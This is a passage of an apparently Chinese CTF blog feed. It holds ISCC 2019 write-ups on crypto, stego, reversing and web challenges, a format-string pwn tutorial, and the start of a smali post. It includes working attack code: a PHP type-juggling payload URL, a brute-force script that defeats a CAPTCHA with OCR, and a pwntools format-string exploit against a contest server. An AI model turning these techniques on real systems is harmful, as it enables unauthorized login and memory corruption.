class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(data)</span>:</span></span><br><span class="line">    length = <span class="number">16</span> - (len(data) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> data + (chr(length)*length).encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> data[:-(data[<span class="number">-1</span>] <span class="keyword">if</span> type(data[<span class="number">-1</span>]) == int <span class="keyword">else</span> ord(data[<span class="number">-1</span>]))]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_key</span><span class="params">(data, salt, output=<span class="number">48</span>)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(salt) == <span class="number">8</span>, len(salt)</span><br><span class="line">    data += salt</span><br><span class="line">    key = md5(data).digest()</span><br><span class="line">    final_key = key</span><br><span class="line">    <span class="keyword">while</span> len(final_key) &lt; output:</span><br><span class="line">        key = md5(key + data).digest()</span><br><span class="line">        final_key += key</span><br><span class="line">    <span class="keyword">return</span> final_key[:output]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">    salt = Random.new().read(<span class="number">8</span>)</span><br><span class="line">    key_iv = bytes_to_key(passphrase, salt, <span class="number">32</span>+<span class="number">16</span>)</span><br><span class="line">    key = key_iv[:<span class="number">32</span>]</span><br><span class="line">    iv = key_iv[<span class="number">32</span>:]</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">b"Salted__"</span> + salt + aes.encrypt(pad(message)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">    encrypted = base64.b64decode(encrypted)</span><br><span class="line">    <span class="keyword">assert</span> encrypted[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">b"Salted__"</span></span><br><span class="line">    salt = encrypted[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">    key_iv = bytes_to_key(passphrase, salt, <span class="number">32</span>+<span class="number">16</span>)</span><br><span class="line">    key = key_iv[:<span class="number">32</span>]</span><br><span class="line">    iv = key_iv[<span class="number">32</span>:]</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> unpad(aes.decrypt(encrypted[<span class="number">16</span>:]))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"ISCC"</span></span><br><span class="line"><span class="comment">#print len(key)</span></span><br><span class="line">c = <span class="string">"U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw=="</span></span><br><span class="line">m = decrypt(c,key)</span><br><span class="line">m = decrypt(m,key)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><p>flag：flag{DugUpADiamondADeepDarkMine}</p><p>知识点：GIF图片，AES</p><h4 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：“想要我的宝藏吗？如果想要的话，那就到碎纸机中找吧，我全部都放在那里。”</span><br></pre></td></tr></table></figure><p>用HxD查看图片，文件末尾发现还包含压缩包以及其他文件。于是binwalk一下，得到如下内容</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/12.JPG" class="lazyload"></p><p>readme.txt内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">碎纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？</span><br><span class="line">我去问了欧鹏・曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。</span><br></pre></td></tr></table></figure><p>好像并没有什么直接的信息，继续用HxD查看每一张图片</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/13.JPG" class="lazyload"></p><p>发现有0x4E2=1250字节的可以数据，且大部分都是00或ff，联想到RGB，（255,255,255）表示白色，（0,0,0）表示黑色，最后应该得到黑色背景的白色flag。于是提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">25</span></span><br><span class="line">y = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">"1.jpg"</span></span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">jpg = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(ord(jpg[<span class="number">0</span>]))</span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))</span><br><span class="line"><span class="comment">#index = 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">rgb = ord(jpg[j*<span class="number">25</span> + i])</span><br><span class="line">im.putpixel((i,j),(rgb,rgb,rgb))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">"flag1.jpg"</span>)</span><br></pre></td></tr></table></figure><p>提取前两个，发现</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/flag1.jpg" class="lazyload"><img alt="" data-src="/2019/05/05/ISCC2019解题记录/flag2.jpg" class="lazyload"></p><p>然后全部提取出来，得到</p><p>flag：Flag={ISCC_is_interesting_!}</p><p>知识点：图片隐写，RGB通道</p><h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="answer-to-everything"><a href="#answer-to-everything" class="headerlink" title="answer to everything"></a>answer to everything</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tip：sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。</span><br><span class="line">注意：将得到的flag变为ISCC&#123;flag&#125;形式提交。</span><br></pre></td></tr></table></figure><p>给的文件是.exe，用DIE查看发现是ELF64。用ida打开</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/4.png" class="lazyload"></p><p>输入42，得到kdudpeh，根据提示，sha1之后加上格式即为flag</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/5.JPG" class="lazyload"></p><p>flag:ISCC{80ee2a3fe31da904c596d993f7f1de4827c1450a}</p><p>知识点：ida使用</p><h4 id="Rev01"><a href="#Rev01" class="headerlink" title="Rev01"></a>Rev01</h4><p>这是一道rust程序的逆向，INS hack teaser 2019有一道类似的题（<a href="https://www.anquanke.com/post/id/169970）" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169970）</a></p><p>跟着上面的思路，找到程序入口</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/6.JPG" class="lazyload"></p><p>进去后找到关键代码</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/7.JPG" class="lazyload"></p><p>程序大致意思是：程序经过一系列运算的到一串字符v34，然后将该字符移位异或操作之后与输入的值进行比较。</p><p>因此只要找到程序生成的字符串就可以了，具体算法很复杂，于是用gdb动态调试，在do-while循环结束的地方下断点，然后查看v34的类容。</p><p>具体调试过程如下</p><p>gdb载入文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b main</span><br><span class="line">Breakpoint 5 at 0x55555555ab10</span><br><span class="line">gdb-peda$ run</span><br></pre></td></tr></table></figure><p>找到程序入口</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/9.JPG" class="lazyload"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b _ZN15beginer_reverse4main17h80fa15281f646bc1E</span><br><span class="line">Breakpoint 6 at 0x55555555a6a0</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure><p>在ida中找到do-while循环结束的地方</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/8.JPG" class="lazyload"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x000055555555a9a8</span><br><span class="line">Breakpoint 7 at 0x55555555a9a8</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">abc123456  <span class="comment">##输入的类容</span></span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/10.JPG" class="lazyload"></p><p>r14是输入的类容，r15即我们需要的类容，dump下来解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"0x000001540x000001800x000001fc0x000001e4 0x000001f80x000001540x000001900x000001bc 0x000001bc0x000001b80x000001540x000001f8 0x000001940x000001540x000001b40x000001bc 0x000001f80x000001540x000001f40x00000188 0x000001ac0x000001f80x000001540x0000018c 0x000001e40x000001540x000001900x000001bc 0x000001bc0x000001b80x000001bc0x000001b8 0x000001540x00000090"</span></span><br><span class="line">s = s.replace(<span class="string">"\t"</span>,<span class="string">" "</span>).split(<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag += (chr((int(i,<span class="number">16</span>)&gt;&gt;<span class="number">2</span>) ^ <span class="number">0xa</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag：_just_need_to_get_what_is_needed_.</p><p>知识点：rust程序逆向、gdb动态调试</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>大致意思：get value数组和password，value的值要为’w3lc0me_To_ISCC2019’</p><p>问题在chr和intval两个函数，value[i]不能为[32,127],chr()函数对大于256的值会首先模256，即chr(256+ord(‘A’)) = ‘A’,PHP 5.x中intval()无法处理十六进制，所以只要password&gt;=0x91d即可，所以构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"w3lc0me_To_ISCC2019"</span></span><br><span class="line">payload = <span class="string">"password = 0x91d"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">a = <span class="number">256</span> + ord(i)</span><br><span class="line">a = <span class="string">"&amp;value[]="</span> + str(a)</span><br><span class="line">payload += a</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://39.100.83.188:8001/?password=0x91d&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313</span></span><br></pre></td></tr></table></figure><p>flag：flag{8311873e241ccad54463eaa5d4efc1e9}</p><p>知识点：PHP中的chr和intval函数</p><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/11.JPG" class="lazyload"></p><p>带验证码的密码爆破，验证码就是为了防止爆破的，但是这里的验证码可以用文字识别。调用百度的api,脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">APP_ID = <span class="string">'your API_ID'</span></span><br><span class="line">API_KEY = <span class="string">'your API_KEY'</span></span><br><span class="line">SECRET_KEY = <span class="string">'your SECRET_KEY'</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line"><span class="string">""" 读取图片 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvcode</span><span class="params">(session)</span>:</span></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8002/vcode.php"</span></span><br><span class="line">vcode = session.get(url)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"1.png"</span>,<span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(vcode.content)</span><br><span class="line"></span><br><span class="line">image = get_file_content(<span class="string">'1.png'</span>)</span><br><span class="line">a = client.basicGeneral(image);</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a = a[<span class="string">"words_result"</span>][<span class="number">0</span>][<span class="string">"words"</span>]</span><br><span class="line"><span class="keyword">if</span> len(a) == <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">return</span> getvcode(session)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> getvcode(session)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteForce</span><span class="params">(session,passwd)</span>:</span></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8002/login.php"</span></span><br><span class="line">data = &#123;&#125;</span><br><span class="line">data[<span class="string">"username"</span>] = <span class="string">"admin"</span></span><br><span class="line">data[<span class="string">"pwd"</span>] = str(passwd)</span><br><span class="line">data[<span class="string">"user_code"</span>] = getvcode(session)</span><br><span class="line">data[<span class="string">"Login"</span>] = <span class="string">"submit"</span></span><br><span class="line"><span class="comment">#print data</span></span><br><span class="line">res = session.post(url,data = data)</span><br><span class="line"><span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">result = bruteForce(sess,i)</span><br><span class="line"><span class="keyword">while</span>(<span class="string">"验证码"</span> <span class="keyword">in</span> result):</span><br><span class="line">result = bruteForce(sess,i)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%d:"</span>%i ,result</span><br></pre></td></tr></table></figure><p>flag：flag{996_ICU}</p><p>知识点：文字识别，密码爆破</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Pwn01"><a href="#Pwn01" class="headerlink" title="Pwn01"></a>Pwn01</h4><p>ida打开，发现存在缓冲区溢出</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/14.JPG" class="lazyload"></p><p>checksec，发现开启了NX保护，不会绕过，卒！</p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之fmtstr</title>
      <link href="/2019/05/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bfmtstr/"/>
      <url>/2019/05/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bfmtstr/</url>
      
        <content type="html"><![CDATA[<p>格式化字符串漏洞的原理就不赘述了，直接以jarvisoj上的一道pwn题fm来探寻一下这个漏洞！</p><p>checksec,canary,NX 开启，partial RELRO表示got表可读可写</p><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/1.JPG" class="lazyload"></p><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/2.JPG" class="lazyload"></p><p>存在格式化字符串，gdb调试一下，首先在printf处下一断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d:输出十进制整数，可配上%n向指定地址写数据</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/3.JPG" class="lazyload"></p><p>c继续运行</p><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/4.JPG" class="lazyload"></p><p>-11540是0xffffd2ec作为有符号补码对应的值，说明0xffffd2c0是printf的第一个参数。下面我们来输出一下第三个参数0x50对应的十进制数80。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2$d:输入第3个参数的十进制整数。</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/5.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%c:输出字符，可配上%n向指定地址写数据</span><br><span class="line">%2$c:输出第三个参数的字符，即&apos;P&apos;</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/6.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%x:输出16进制数据，可以用来泄露内存数据</span><br><span class="line">%3$x:输出第四个参数的内存数据，即f7ffde24</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/7.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%p:输出附加0x前缀的十六进制数据，可用来泄露内存数据</span><br><span class="line">%3$p:输出第四个参数的内存数据，即0xf7ffde24</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/8.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%s:输出参数地址所指向的字符串，可用于读取got表、canary等信息</span><br><span class="line">%6$s:输出第六个参数作为地址所指向的内容，即0x28fc表示的字符串</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/9.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%n:将输出的字符个数写到参数所指向的地址中，可用来修改内存中变量的值</span><br><span class="line">%4c%6$n:将第六个参数指向的地址空间的值修改为4,即0xf7ffd000 --&gt; 0x4</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/10.JPG" class="lazyload"></p><p>再来回顾一下这道题，x原来的值为3，需要修改为4才能拿到shell。</p><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/11.JPG" class="lazyload"></p><p>即将0x0804a02c的值修改为4。所以需要将0x0804a02c写入内存并确定它的偏移。首先确定偏移</p><p><img alt="" data-src="/2019/05/01/PWN学习之fmtstr/12.JPG" class="lazyload"></p><p>‘aaaa’是我输入的内容，偏移为11，32位地址刚好四个字节，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9895"</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">"%11$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>smali</title>
      <link href="/2019/04/18/smali/"/>
      <url>/2019/04/18/smali/</url>
      
        <content type="html"><![CDATA[<h3 id="smali简介"><a href="#smali简介" class="headerlink" title="smali简介"></a>smali简介</h3><p>既然是简介，我觉得一句话就够了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smali是Dalvik的寄存器语言，它与Java的关系，简单理解就是汇编之于C。</span><br></pre></td></tr></table></figure><h3 id="一道题目剖析smali"><a href="#一道题目剖析smali" class="headerlink" title="一道题目剖析smali"></a>一道题目剖析smali</h3><p>题目来自于jarvisOJ smali。Crackme.smali，文件内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 